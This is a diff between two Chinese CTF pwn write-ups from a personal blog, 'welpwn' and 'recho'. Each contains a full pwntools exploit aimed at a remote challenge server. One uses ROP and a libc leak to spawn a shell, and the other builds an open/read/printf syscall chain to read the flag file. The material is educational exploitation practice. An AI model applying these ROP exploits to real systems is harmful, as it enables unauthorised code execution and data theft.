@@ -86,23 +86,20 @@
 
 
 
-<meta name="description" content="前言久违地更新博客了，先水一篇题解吧。 题目分析checksec 发现开了NX，栈不可执行了。 IDA 这里是把传进来的buf逐字节赋值给s2，这里有个问题，s2大小是0x10，但是buf有0x400，显然这里存在栈溢出。 解题思路问题在于这个for循环，它的结束条件是读到\x00字节。换句话说就是当它在buf中读到00字节的时候就会停止拷贝字符串到s2，这就存在一个问题 ，之前的溢出好说，但是覆">
+<meta name="description" content="前言一个有意思的溢出题，关键在于如何跳出循环ROP，是我没见过的船新版本，呜呜呜。 前置知识寻找syscallopen、write、read、alarm这些都是系统调用，其汇编代码中是有syscall的，例如alarm_got + 5  &#x3D; syscall 拼出open给eax传系统调用号+寄存器pop传参+syscall &#x3D; open(xxx) 注意： 函数的系统调用号可以在终端用命令跑出来：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界-welpwn">
-<meta property="og:url" content="https://www.sketchplane.top/2020/09/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-welpwn/index.html">
+<meta property="og:title" content="攻防世界-recho">
+<meta property="og:url" content="https://www.sketchplane.top/2020/11/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-recho/index.html">
 <meta property="og:site_name" content="sketch_pl4ne">
-<meta property="og:description" content="前言久违地更新博客了，先水一篇题解吧。 题目分析checksec 发现开了NX，栈不可执行了。 IDA 这里是把传进来的buf逐字节赋值给s2，这里有个问题，s2大小是0x10，但是buf有0x400，显然这里存在栈溢出。 解题思路问题在于这个for循环，它的结束条件是读到\x00字节。换句话说就是当它在buf中读到00字节的时候就会停止拷贝字符串到s2，这就存在一个问题 ，之前的溢出好说，但是覆">
-<meta property="og:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFLE0.png">
-<meta property="og:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFse1.png">
-<meta property="og:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFY8D.png">
-<meta property="og:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFKwu.png">
-<meta property="og:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFdBv.png">
-<meta property="article:published_time" content="2020-09-09T14:50:51.000Z">
-<meta property="article:modified_time" content="2020-10-08T13:34:32.781Z">
+<meta property="og:description" content="前言一个有意思的溢出题，关键在于如何跳出循环ROP，是我没见过的船新版本，呜呜呜。 前置知识寻找syscallopen、write、read、alarm这些都是系统调用，其汇编代码中是有syscall的，例如alarm_got + 5  &#x3D; syscall 拼出open给eax传系统调用号+寄存器pop传参+syscall &#x3D; open(xxx) 注意： 函数的系统调用号可以在终端用命令跑出来：">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2020/11/19/Z2UaG1.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2020/11/19/Z2Ubjd.png">
+<meta property="article:published_time" content="2020-11-19T09:06:12.000Z">
+<meta property="article:modified_time" content="2020-11-19T10:44:53.375Z">
 <meta property="article:author" content="sketch_pl4ne">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://t1.picb.cc/uploads/2020/09/09/tFFLE0.png">
+<meta name="twitter:image" content="https://t1.picb.cc/uploads/2020/11/19/Z2UaG1.png">
 
 
 
@@ -132,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="https://www.sketchplane.top/2020/09/09/攻防世界-welpwn/"/>
+  <link rel="canonical" href="https://www.sketchplane.top/2020/11/19/攻防世界-recho/"/>
 
 
 
 
 
-  <title>攻防世界-welpwn | sketch_pl4ne</title>
+  <title>攻防世界-recho | sketch_pl4ne</title>
   
 
 
@@ -249,7 +246,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/09/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-welpwn/">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/11/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-recho/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sketch_pl4ne">
@@ -266,7 +263,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界-welpwn</h1>
+          <h1 class="post-title" itemprop="name headline">攻防世界-recho</h1>
         
 
         <div class="post-meta">
@@ -278,8 +275,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-09T22:50:51+08:00">
-                2020-09-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-19T17:06:12+08:00">
+                2020-11-19
               </time>
             
 
@@ -315,7 +312,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  510
+                  923
                 </span>
               
 
@@ -331,7 +328,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  3
                 </span>
               
             </div>
@@ -352,28 +349,44 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>久违地更新博客了，先水一篇题解吧。</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFLE0.png" alt="checksec"></p>
-<p>发现开了NX，栈不可执行了。</p>
-<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFse1.png" alt="ida"></p>
-<p>这里是把传进来的buf逐字节赋值给s2，这里有个问题，s2大小是0x10，但是buf有0x400，显然这里存在栈溢出。</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>问题在于这个for循环，它的结束条件是读到\x00字节。换句话说就是当它在buf中读到00字节的时候就会停止拷贝字符串到s2，这就存在一个问题 ，之前的溢出好说，但是覆盖返回地址的时候，必然会出现00字节的情况，这就意味着我们的rop chains将到此终止。</p>
-<img src="https://t1.picb.cc/uploads/2020/09/09/tFFY8D.png" alt="stack" style="zoom:50%;" />
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个有意思的溢出题，关键在于如何跳出循环ROP，是我没见过的船新版本，呜呜呜。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="寻找syscall"><a href="#寻找syscall" class="headerlink" title="寻找syscall"></a>寻找syscall</h3><p>open、write、read、alarm这些都是系统调用，其汇编代码中是有syscall的，例如<code>alarm_got + 5  = syscall</code></p>
+<h3 id="拼出open"><a href="#拼出open" class="headerlink" title="拼出open"></a>拼出open</h3><p>给eax传系统调用号+寄存器pop传参+syscall = open(xxx)</p>
+<p>注意： 函数的系统调用号可以在终端用命令跑出来：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">32位：</span></span><br><span class="line">cat /usr/include/asm/unistd_32.h | grep alarm</span><br><span class="line"><span class="meta">#</span><span class="bash">64位：</span></span><br><span class="line">cat /usr/include/asm/unistd_64.h | grep alarm</span><br></pre></td></tr></table></figure>
 
+<h3 id="结束死循环"><a href="#结束死循环" class="headerlink" title="结束死循环"></a>结束死循环</h3><p>pwntools自带关闭流的函数： <code>io.shutdown( [&#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;])</code>，🛫️</p>
+<p>注意：这个关闭流之后就没法在打开了，也就是说，我们<strong>无法走先泄漏真实地址再返回主函数</strong>故技重施的路子了，这里是直接一次ROP到底。</p>
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>首先，万年不变的起手checksec，没PIE没canary，针不戳：</p>
+<p><img src="https://t1.picb.cc/uploads/2020/11/19/Z2UaG1.png" alt="checksec"></p>
+<p>然后，IDA64分析代码：</p>
+<img src="https://t1.picb.cc/uploads/2020/11/19/Z2Ubjd.png" alt="ida" style="zoom:80%;" />
 
+<p>整个程序看下来，首先获取一个size，然后atoi()转成数字，在根据size大小获取输入，存入buf中。</p>
+<p>这里显然存在一个栈溢出漏洞，问题在于我们第一次输入的size大于零，while就是死循环，我们如果不能结束循环就无法执行我们构造的ROP，幸好pwntools为我们提供了一个这样的函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown</span><span class="params">(self, direction = <span class="string">"send"</span>)</span>:</span></span><br><span class="line">        <span class="string">"""shutdown(direction = "send")</span></span><br><span class="line"><span class="string">        Closes the tube for futher reading or writing depending on `direction`.</span></span><br><span class="line"><span class="string">        Arguments:</span></span><br><span class="line"><span class="string">          direction(str): Which direction to close; "in", "read" or "recv"</span></span><br><span class="line"><span class="string">            closes the tube in the ingoing direction, "out", "write" or "send"</span></span><br><span class="line"><span class="string">            closes it in the outgoing direction.</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">          :const:`None`</span></span><br></pre></td></tr></table></figure>
 
-<p>根据函数调用栈的传参规则，main函数栈帧和echo函数栈帧的主要结构如上图所示，我们可以用gdb验证下：</p>
-<p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFKwu.png" alt="offset check"></p>
-<p>可以看到buf和s2的距离就是0x20，也就是相距4个Qword。</p>
-<p>由于在覆盖返回地址之后，如果我们接着输入构造 rop 的 gadgets是会截断的，这里我们用pop4的gadget来实现”跳跃“</p>
-<img src="https://t1.picb.cc/uploads/2020/09/09/tFFdBv.png" alt="stack2" style="zoom:50%;" />
+<p>接下来就是如何在一次ROP中获取flag，使用之前的暴露地址的方法是没法完成了，这里我们通过open来读取flag文件并打印出来。</p>
+<p>我们想要实现的代码应该是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"flag"</span>,READONLY);  </span><br><span class="line"><span class="built_in">read</span>(fd,buf,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
 
-<p>可以看到如果我们这样输入，s2处填入pop4后还是会停止复制没错，不过我们因为pop4个Qword 的数据，程序因此会执行到buf处pop4后面的指令，即可构造rop chains。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54825</span>)</span><br><span class="line"><span class="comment">#io = process('./welpwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">pop_4= <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">padding = <span class="number">0x18</span></span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span>*padding + p64(pop_4) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'to RCTF\n'</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">'\x40'</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*padding + p64(pop_4) + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>那么构造思路如下：</p>
+<ol>
+<li>想办法调用open，这里事先没有open，通过<code>alarm_got+5</code>得到syscall，然后给eax传open的系统调用号即可</li>
+<li>read，buf存到bss段（因为这里可读可写，gdb中用<code>vmmap</code>可以查看各个段的RWX情况）</li>
+<li>printf打印buf</li>
+<li>io.shundown(‘send’)</li>
+</ol>
+<p><strong>注意：</strong></p>
+<ul>
+<li>这里有一条关键gadgets：<code>add_rdi_al_ret</code>，rdi里放alarm_got，al (即eax) 放5，使得alarm函数got表里的地址变成syscall</li>
+<li>bss段在ida里看到的是从<code>0x601060</code>开始，但实际上用这个地址会读出奇怪的东西，改成<code>0x601070</code>或者更大就没问题</li>
+<li>io.shutdown()里面的参数得是<code>[&#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;]</code>中的一个</li>
+</ul>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">32168</span>)</span><br><span class="line">elf = ELF(<span class="string">'./recho'</span>)</span><br><span class="line"></span><br><span class="line">flag_str = next(elf.search(<span class="string">b'flag'</span>))</span><br><span class="line">bss = <span class="number">0x601070</span></span><br><span class="line">pop_rax_ret = <span class="number">0x4006fc</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4008a1</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4006fe</span></span><br><span class="line">add_rdi_al_ret = <span class="number">0x40070d</span></span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">'alarm'</span>]</span><br><span class="line">alarm_plt = elf.plt[<span class="string">'alarm'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'server!\n'</span>, str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是改变alarm的got表中的地址为syscall</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi_ret)+p64(alarm_got)+p64(pop_rax_ret)+p64(<span class="number">0x5</span>)+p64(add_rdi_al_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># int fd = open("flag",READONLY); </span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(flag_str)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(alarm_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,buf,100);</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r15_ret)+p64(bss)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf(buf);</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(printf_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尽量使字符串长，这样才能将我们的payload全部输进去，不然可能因为会有缓存的问题导致覆盖不完整，eax</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.shutdown(<span class="string">'send'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>LibcSearcher是第一次用，可以方便地获取libc的偏移，减少重复劳动。</p>
-<p>至于为什么io.recvuntil(‘\x40’)，自己写写exp就会知道了= =</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>每一道题都仔细写wp有丶麻烦，闲着没事干的时候(不想做题)就水一篇吧（</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>嗯，这题学到不少新东西。</p>
+<p>首先是用io.shutdown(“send”)可以关闭流达到远程调试退出死循环的目的，然后是通过找gadgets可以利用已有的系统调用找出syscall，拼凑出未被导入的系统调用，还有就是open-&gt;read-&gt;printf这个读flag的方法。</p>
 
       
     </div>
@@ -404,8 +417,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/04/07/RCE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" rel="next" title="RCE的那些事儿">
-                <i class="fa fa-chevron-left"></i> RCE的那些事儿
+              <a href="/2020/11/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supermarket/" rel="next" title="攻防世界-supermarket">
+                <i class="fa fa-chevron-left"></i> 攻防世界-supermarket
               </a>
             
           </div>
@@ -414,8 +427,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/" rel="prev" title="攻防世界-note-service2">
-                攻防世界-note-service2 <i class="fa fa-chevron-right"></i>
+              <a href="/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/" rel="prev" title="sketch_pl4neのdiary">
+                sketch_pl4neのdiary <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -569,7 +582,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-number">2.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA"><span class="nav-number">2.2.</span> <span class="nav-text">IDA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">3.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找syscall"><span class="nav-number">2.1.</span> <span class="nav-text">寻找syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拼出open"><span class="nav-number">2.2.</span> <span class="nav-text">拼出open</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结束死循环"><span class="nav-number">2.3.</span> <span class="nav-text">结束死循环</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目信息"><span class="nav-number">3.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">4.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
